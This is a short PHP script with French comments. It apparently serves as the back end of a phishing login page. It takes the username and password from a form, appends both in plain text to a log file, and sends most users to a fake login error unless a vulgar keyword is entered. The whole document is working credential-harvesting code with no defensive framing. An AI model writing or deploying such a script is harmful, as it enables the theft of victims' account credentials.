<?php
// Enregistrer dans un fichier texte
$log_file = 'connexions.txt';

// Récupérer les données
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

// Formater la ligne à enregistrer
$log_entry = sprintf(
    "[%s] Username: %s | Password: %s\n",
    date('Y-m-d H:i:s'),
    $user,
    $pass
);

// Ajouter au fichier
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirection
if(stripos($user, 'pute') !== false || stripos($pass, 'pute') !== false) {
    header("Location: success.html");
} else {
    header("Location: login.html?error=1");
}
?>
